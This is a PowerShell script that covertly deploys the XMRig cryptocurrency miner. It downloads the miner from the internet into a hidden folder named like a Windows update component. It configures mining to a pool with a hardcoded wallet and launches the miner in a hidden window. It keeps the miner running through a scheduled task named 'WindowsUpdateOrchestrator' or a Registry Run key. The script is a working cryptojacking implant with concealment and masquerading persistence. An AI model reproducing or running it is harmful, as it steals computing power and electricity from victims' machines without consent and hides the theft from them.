# ================================================
# XMRig DEBUG v4 - Minimal & Robust
# No boolean parameter issues
# ================================================

$LogFile = "C:\Windows\Temp\xmr_deploy_debug_v4.log"

function Log {
    param([string]$Message)
    $Timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    "$Timestamp | $Message" | Out-File -FilePath $LogFile -Append -Encoding UTF8
    Write-Host "$Timestamp | $Message" -ForegroundColor Cyan
}

Log "=== XMRig DEBUG v4 STARTED ==="

$InstallDir = "C:\ProgramData\XMRUpdate"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}
Log "Install dir created"

# Download and extract
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig-v4.zip"

Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing
Log "Downloaded"

Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue

$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
}
Log "Extracted"

$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" | Select-Object -First 1).FullName
Log "Exe: $ExePath"

# Config
$ConfigJson = @"
{
  "autosave": false,
  "colors": false,
  "cpu": {
    "enabled": true,
    "max-threads-hint": 60
  },
  "donate-level": 0,
  "pools": [
    {
      "algo": "rx/0",
      "url": "pool.supportxmr.com:443",
      "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
      "pass": "x",
      "keepalive": true,
      "tls": true,
      "rig-id": "$env:COMPUTERNAME"
    }
  ],
  "print-time": 60
}
"@
$ConfigPath = "$InstallDir\config.json"
$ConfigJson | Out-File $ConfigPath -Encoding UTF8 -Force
Log "Config created"

# Start miner
Start-Process -FilePath $ExePath -ArgumentList "-c `"$ConfigPath`" -B --no-color" -WindowStyle Hidden
Log "Miner started hidden"

# Persistence - Ultra simple (no advanced settings)
$TaskName = "WindowsUpdateOrchestrator"
$Action = New-ScheduledTaskAction -Execute $ExePath -Argument "-c `"$ConfigPath`" -B --no-color"
$Trigger = New-ScheduledTaskTrigger -AtLogOn

try {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Force | Out-Null
    Log "Scheduled task created successfully"
} catch {
    Log "Task failed: $($_.Exception.Message)"
    # Registry fallback
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "`"$ExePath`" -c `"$ConfigPath`" -B --no-color" -Force
    Log "Registry Run key created as fallback"
}

Log "=== XMRig DEBUG v4 FINISHED ==="
Log "Check with: tasklist | findstr xmrig"
